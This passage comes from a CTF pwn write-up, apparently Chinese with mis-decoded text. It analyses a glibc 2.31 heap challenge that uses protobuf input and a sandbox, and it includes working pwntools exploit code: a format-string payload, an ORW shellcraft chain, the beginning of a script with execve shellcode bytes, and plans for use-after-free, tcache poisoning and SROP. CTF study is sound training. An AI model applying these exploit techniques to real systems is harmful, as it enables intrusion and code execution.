operator">=</span><span class="token number">0x0000000000404060</span>orwchain<span class="token operator">=</span>shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./flag'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>orwchain<span class="token operator">+=</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'rsp'</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">)</span>orwchain<span class="token operator">+=</span>shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'rsp'</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">712</span><span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'c%34$hn'</span> <span class="token comment">#34</span>payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">0x28</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>asm<span class="token punctuation">(</span>orwchain<span class="token punctuation">)</span><span class="token comment">#dbg('b *0x000000000040146C\nc\n')</span>sa<span class="token punctuation">(</span><span class="token string">'start!'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/d5979ae7620a1e44c7a96ef663584525_MD5.jpeg"></p><h1 id="chat"><a href="#chat" class="headerlink" title="chat"></a>chat</h1><blockquote><p>ä¸€é“4è§£é¢˜ï¼Œåœ¨èµ›åè§£å‡ºæ¥äº†ğŸ˜ </p></blockquote><p>ã€2.31-0ubuntu9.12ã€‘å †é£æ°´ï¼Œprotobufåºåˆ—åŒ–ï¼Œ2.31å †æ²™ç›’<br>ä¿æŠ¤å…¨å¼€ï¼Œè¿˜æ˜¯æ²™ç›’<br><img src="/EXP_FILE/05e598de0cef3e5612840f8346e8972a_MD5.jpeg"></p><h2 id="ç¨‹åºåˆ†æ-1"><a href="#ç¨‹åºåˆ†æ-1" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h2><p>æœ‰å¢åˆ æŸ¥æ”¹å››ä¸ªåŠŸèƒ½ï¼Œä¸è¿‡åœ¨å¼€å§‹çš„chooseä¸Šå°±éš¾ä½äº†æˆ‘ä»¬</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">  <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x10uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment">// choose</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">>=</span> <span class="token number">0x11</span> <span class="token punctuation">)</span>    <span class="token function">my_error</span><span class="token punctuation">(</span><span class="token string">"Read Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token function">sub_1C15</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> v4<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token number">4</span> <span class="token punctuation">)</span>    <span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token function">edit</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">></span> <span class="token number">4</span> <span class="token punctuation">)</span>  <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span> v3 <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">case</span> <span class="token number">3u</span><span class="token operator">:</span>    <span class="token function">show</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token keyword">case</span> <span class="token number">1u</span><span class="token operator">:</span>    <span class="token function">add</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token keyword">case</span> <span class="token number">2u</span><span class="token operator">:</span>    <span class="token function">delete</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token keyword">default</span><span class="token operator">:</span>    <span class="token keyword">goto</span> LABEL_14<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¾æ®v3æ¥è¿›è¡Œé€‰æ‹©ï¼Œè€Œv3&#x3D;*(v5+32)ï¼›è€Œv5ç”±<code>v5 = sub_1C15(0LL, v4, buf);</code>å¾—åˆ°ï¼Œå…¶ä¸­v4æ˜¯æˆ‘ä»¬è¾“å…¥çš„é•¿åº¦ï¼Œbufæ˜¯è¾“å…¥çš„å†…å®¹ã€‚è¿™ä¸ªå‡½æ•°å¦‚ä¸‹ï¼š<br><img src="/EXP_FILE/cfeb9470b6c5445a203d0a8bd3a33a57_MD5.jpeg"><br>è¿™è²Œä¼¼æ˜¯ä¸€ä¸ªè§£åŒ…å‡½æ•°ï¼Œå¯¹æˆ‘ä»¬çš„è¾“å…¥å†…å®¹è¿›è¡Œè§£åŒ…ã€‚ç»è¿‡æµè§ˆå™¨æœç´¢å¯çŸ¥æ˜¯protobufåºåˆ—åŒ–ï¼Œæˆ‘ä»¬éœ€è¦ä¼ å…¥ä¸€ä¸ªç»“æ„ä½“å¹¶è¿›è¡Œprotobufæ‰“åŒ…ï¼Œç½‘ä¸Šæ•™ç¨‹å¾ˆå¤šï¼Œåœ¨æ­¤ä¸å†èµ˜è¿°</p><blockquote><p>Protobuf (Protocol Buffers) æ˜¯è°·æ­Œå¼€å‘çš„ä¸€æ¬¾æ— å…³å¹³å°ï¼Œæ— å…³è¯­è¨€ï¼Œå¯æ‰©å±•ï¼Œè½»é‡çº§é«˜æ•ˆçš„åºåˆ—åŒ–ç»“æ„çš„æ•°æ®æ ¼å¼ï¼Œç”¨äºå°†è‡ªå®šä¹‰æ•°æ®ç»“æ„åºåˆ—åŒ–æˆå­—èŠ‚æµï¼Œå’Œå°†å­—èŠ‚æµååºåˆ—åŒ–ä¸ºæ•°æ®ç»“æ„ã€‚æ‰€ä»¥å¾ˆé€‚åˆåšæ•°æ®å­˜å‚¨å’Œä¸ºä¸åŒè¯­è¨€ï¼Œä¸åŒåº”ç”¨ä¹‹é—´äº’ç›¸é€šä¿¡çš„æ•°æ®äº¤æ¢æ ¼å¼ï¼Œåªè¦å®ç°ç›¸åŒçš„åè®®æ ¼å¼ï¼Œå³åç¼€ä¸ºprotoæ–‡ä»¶è¢«ç¼–è¯‘æˆä¸åŒçš„è¯­è¨€ç‰ˆæœ¬ï¼ŒåŠ å…¥å„è‡ªçš„é¡¹ç›®ä¸­ï¼Œè¿™æ ·ä¸åŒçš„è¯­è¨€å¯ä»¥è§£æå…¶å®ƒè¯­è¨€é€šè¿‡Protobufåºåˆ—åŒ–çš„æ•°æ®ã€‚ç›®å‰å®˜æ–¹æä¾›c++ï¼Œjavaï¼Œgoç­‰è¯­è¨€æ”¯æŒã€‚</p></blockquote><p>å¦‚ä½•ç¡®å®šç»“æ„ä½“æˆå‘˜ï¼Œåœ¨.data.rel.roæ®µçœ‹å‡ºäº†ç«¯å€ª<br><img src="/EXP_FILE/2b362bd22552955f8a8ff30bba5dff1d_MD5.jpeg"><br>å†ç»è¿‡å¯¹å„åŠŸèƒ½å‡½æ•°åç§»çš„åˆ†æï¼Œå¯çŸ¥ç»“æ„ä½“å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">msg</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> flag <span class="token punctuation">;</span><span class="token keyword">long</span> <span class="token keyword">int</span> choice<span class="token punctuation">;</span><span class="token keyword">long</span> <span class="token keyword">int</span> idx<span class="token punctuation">;</span><span class="token keyword">long</span> <span class="token keyword">int</span> size<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><ul><li><p>add</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">add</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+14h] [rbp-Ch]</span>  <span class="token keyword">void</span> <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"ADD"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// flag:0x18</span>    <span class="token function">my_error</span><span class="token punctuation">(</span><span class="token string">"Wrong flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment">// idx:0x28</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4060 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v2<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token function">my_error</span><span class="token punctuation">(</span><span class="token string">"Wrong idx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4060 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v2<span class="token punctuation">)</span> <span class="token operator">=</span> v2<span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4064 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v2<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// size:0x30</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4064 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v2<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0x80u</span> <span class="token punctuation">)</span><span class="token comment">// åªèƒ½åœ¨0x80ä»¥å†…</span>    <span class="token function">my_error</span><span class="token punctuation">(</span><span class="token string">"Wrong size"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4064 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v3 <span class="token punctuation">)</span>    <span class="token function">my_error</span><span class="token punctuation">(</span><span class="token string">"Malloc failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  heaparray<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> v2<span class="token punctuation">]</span> <span class="token operator">=</span> v3<span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Please input the content: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>heaparray<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> v2<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4064 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v2<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>    <span class="token function">my_error</span><span class="token punctuation">(</span><span class="token string">"Read Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Add success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>delete</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">sub_179D</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-4h]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"DELETE"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">my_error</span><span class="token punctuation">(</span><span class="token string">"Wrong flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4060 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4064 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token function">my_error</span><span class="token punctuation">(</span><span class="token string">"Wrong idx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>heaparray<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">// uaf</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ‰ä¸€ä¸ªuaf</p></li><li><p>show</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">sub_1916</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-4h]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"SHOW"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">my_error</span><span class="token punctuation">(</span><span class="token string">"Wrong flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4060 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v2<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4064 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v2<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token function">my_error</span><span class="token punctuation">(</span><span class="token string">"Wrong idx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>heaparray<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> v2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>edit</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> __fastcall <span class="token function">sub_183C</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token class-name">ssize_t</span> result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-4h]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"EDIT"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">my_error</span><span class="token punctuation">(</span><span class="token string">"Wrong flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4060 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v2<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4064 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v2<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token function">my_error</span><span class="token punctuation">(</span><span class="token string">"Wrong idx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Please input the content: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>heaparray<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> v2<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4064 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>    <span class="token function">my_error</span><span class="token punctuation">(</span><span class="token string">"Read Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><p>è¾“å…¥çš„sizeåªèƒ½åœ¨0x80ä»¥å†…ï¼Œæˆ‘ä»¬åªèƒ½å¾—åˆ°tcachebin chunkå’Œfastbin chunkï¼Œå¯¹äºåˆ©ç”¨æˆ‘ä»¬æœ‰ä»¥ä¸‹å‡ ä¸ªéš¾é¢˜ï¼š</p><ol><li><p>æ³„éœ²libcï¼šæ²¡æœ‰unsortedbin chunkï¼Œæƒ³è¿‡åˆ©ç”¨malloc_consolidateå¾—åˆ°unsortedbin chunkï¼Œä½†æ˜¯ç”³è¯·chunkæ—¶ä¼šå‡ºç°0x40å’Œ0x20çš„chunkä¸å…¶å®ƒchunkåˆ†éš”å¼€ï¼Œæ— æ³•è§¦å‘malloc_consolidateæ¥åˆå¹¶fastbin<br><img src="/EXP_FILE/bb03948443ab05b5e93b62ace2b52815_MD5.jpeg"><br>å¯¹ç­–ï¼šæˆ‘ä»¬èƒ½å¾—åˆ°å †åœ°å€ï¼Œåˆ©ç”¨tcache posioningç¯¡æ”¹å…¶å®ƒtcache chunk-&gt;sizeï¼Œå¾—åˆ°unsortedbin chunk</p></li><li><p>è¦æ‰“2.31çš„orwï¼Œ0x80çš„chunkå¤§å°æ— æ³•å®¹çº³srop_frame</p></li></ol><p>æœ‰è¿™æ ·ä¸€ä¸ªgadgetï¼Œå¯ä»¥é€šè¿‡rdiæ§åˆ¶rdxï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">pwndbg<span class="token operator">></span> pdisass getkeyserv_handle<span class="token operator">+</span><span class="token number">576</span> â–º <span class="token number">0x7f0d55f0f930</span> <span class="token operator">&lt;</span>getkeyserv_handle<span class="token operator">+</span><span class="token number">576</span><span class="token operator">></span>    mov    rdx<span class="token punctuation">,</span> qword ptr <span class="token punctuation">[</span>rdi <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span>   <span class="token number">0x7f0d55f0f934</span> <span class="token operator">&lt;</span>getkeyserv_handle<span class="token operator">+</span><span class="token number">580</span><span class="token operator">></span>    mov    qword ptr <span class="token punctuation">[</span>rsp<span class="token punctuation">]</span><span class="token punctuation">,</span> rax   <span class="token number">0x7f0d55f0f938</span> <span class="token operator">&lt;</span>getkeyserv_handle<span class="token operator">+</span><span class="token number">584</span><span class="token operator">></span>    call   qword ptr <span class="token punctuation">[</span>rdx <span class="token operator">+</span> <span class="token number">0x20</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬ä¸éœ€è¦æ§åˆ¶å…¨éƒ¨çš„frameï¼Œåªéœ€è¦frameçš„rspå’Œripä½ï¼Œåç§»ä¸º0xa8ï¼š<br><img src="/EXP_FILE/5fe5d0ad0378ccfb9017c1b96c86bc75_MD5.jpeg"></p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å †é£æ°´æŠ€å·§ï¼Œè¿™æ ·è¿›è¡Œå †çš„æ’å¸ƒï¼š<br><img src="/EXP_FILE/71e0ae5f8f3ea8db7539e6b75eca7e52_MD5.jpeg"></p><ol start="3"><li>chunkæ— æ³•å®¹çº³ï¼šè¦æ‰“2.31çš„orwï¼Œ0x80çš„chunkå¤§å°æ— æ³•å®¹çº³0xa8çš„orwchain<br>å¯¹ç­–ï¼šæ—¢ç„¶æˆ‘ä»¬èƒ½æ§åˆ¶æ‰§è¡Œæµäº†ï¼Œç›´æ¥è°ƒç”¨readè¿›è¡Œå †ä¸Šå†™å¹¶è°ƒç”¨ï¼Œç„¶åæˆ‘ä»¬æ‰‹åŠ¨å‘é€orwå³å¯<br><img src="/EXP_FILE/b560713c1f4f0f1fa9088f95f44bada5_MD5.jpeg"><br>EXPï¼š<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># !/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span>she_i386_20<span class="token operator">=</span><span class="token string">b"\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"</span>she_amd64_30<span class="token operator">=</span><span class="token 